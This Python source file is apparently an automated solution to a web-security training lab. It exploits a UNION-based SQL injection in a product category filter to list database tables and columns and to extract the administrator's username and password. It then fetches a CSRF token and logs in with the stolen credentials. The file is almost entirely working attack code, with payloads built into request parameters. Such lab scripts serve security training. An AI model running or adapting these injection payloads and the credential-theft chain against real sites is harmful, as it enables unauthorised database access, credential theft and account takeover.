from base.base import Base
from bs4 import BeautifulSoup

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def _add_args(self):
        pass

    def _parse_response(self, response):
        soup = BeautifulSoup(response.text, 'html.parser')
        parsed_content = []
        for table in soup.find_all('table', class_="is-table-longdescription"):
            tbody = table.find('tbody')
            if tbody:
                for tr in tbody.find_all('tr'):
                    header = tr.find('th').text
                    content = tr.find('td').text
                    
                    parsed_content.append({"header": header, "content": content})
        return parsed_content

    def _get_table_names(self):
        params = {'category': "Gifts' union select table_schema, table_name from information_schema.tables-- "}
        response = self.session.get(f"{self.base_url}/filter", params=params)
        table_names = self._parse_response(response)
        
        clean_table_names = []
        for table in table_names:
            if table["header"] != "pg_catalog" and table["header"] != "information_schema" and table["content"] != "products":
                clean_table_names.append(table["content"])
        return clean_table_names.pop()

    def _get_table_columns(self, table_name):   
        params = {'category': f"Gifts' union select is_nullable, column_name from information_schema.columns where table_name = '{table_name}'-- "}
        response = self.session.get(f"{self.base_url}/filter", params=params)
        table_columns = self._parse_response(response)
        to_return = {'users_table': None, 'passwords_table': None}
        for column in table_columns:
            if "password" in column["content"]:
                to_return['passwords_table'] = column["content"]
            elif "username" in column["content"]:
                to_return['users_table'] = column["content"]
        return to_return
    
    def _get_table_data(self, table_name, column_one, column_two):
        params = {'category': f"Gifts' union select {column_one}, {column_two} from {table_name}-- "}
        response = self.session.get(f"{self.base_url}/filter", params=params)
        table_data = self._parse_response(response)
        to_return = {'username': None, 'password': None}
        for row in table_data:
            if row["header"] == "administrator":
                to_return['username'] = row["header"]
                to_return['password'] = row["content"]
                return to_return
        return None
    
    def _get_csrf_token(self):
        response = self.session.get(f"{self.base_url}/login")
        
        # Extract CSRF token from the hidden input field in the HTML response
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', attrs={'name': 'csrf'})
        
        if csrf_input and csrf_input.get('value'):
            csrf_token = csrf_input.get('value')
            self.log(f"Found CSRF token: {csrf_token}", "verbose")
        else:
            self.log("Could not find CSRF token in the response", "error")
            exit(1)
            
        return csrf_token

    def run(self):
        users_table = self._get_table_names()
        self.log(f"Identified users table: {users_table}", "verbose")

        users_table_columns = self._get_table_columns(users_table)
        self.log(f"Identified users table columns: {users_table_columns}", "verbose")

        data = self._get_table_data(users_table, users_table_columns['users_table'], users_table_columns['passwords_table'])
        if data is None:
            self.log("Failed to get compromised credentials", "error")
            exit(1)
        
        csrf_token = self._get_csrf_token()
        self.params = {'username': data['username'], 'password': data['password'], 'csrf': csrf_token}
        response = self.session.post(f"{self.base_url}/login", data=self.params)

        self.log(f"Response status code: {response.status_code}", "verbose")

        self.is_lab_solved()
        


if __name__ == "__main__":
    sql = SQL()
    sql.run()